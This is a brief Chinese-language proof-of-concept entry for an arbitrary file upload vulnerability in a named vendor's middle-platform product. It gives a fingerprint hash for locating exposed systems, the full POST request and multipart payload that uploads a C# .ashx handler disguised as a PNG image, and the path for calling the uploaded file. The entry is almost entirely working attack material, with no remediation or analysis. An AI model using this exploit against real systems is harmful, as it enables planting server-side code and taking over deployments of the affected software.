# 山东聚恒网络技术有限公司聚恒中台data.ashx存在任意文件上传漏洞

- **系统**：山东聚恒网络技术有限公司聚恒中台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`icon_hash="-2049533275"`
- **请求**：`POST /sysplat/dataget/data.ashx?type=voheadfile&key=&ocrtype=&vo=&field=1 HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----geckoformboundary9933b1efc…`　`Content-Length: 681918`

**请求体 / payload**
```
------geckoformboundary9933b1efc5e0d94a40b1571aebec8742
Content-Disposition: form-data; name="txt_headfile"; filename="glass.ashx"
Content-Type: image/png
<%@ WebHandler Language="C#" Class="Hello" %>
using System.Web;public class Hello:IHttpHandler{public void ProcessRequest(HttpContext c){c.Response.Write("hello");}public bool IsReusable{get{return false;}}}
------geckoformboundary9933b1efc5e0d94a40b1571aebec8742--
上传定位:
GET /sysplat/dataget/files/039cc123-dbbf-4405-bd85-4f85926a8489.ashx HTTP/1.1
Host:
```
- **预期**：200　|　hello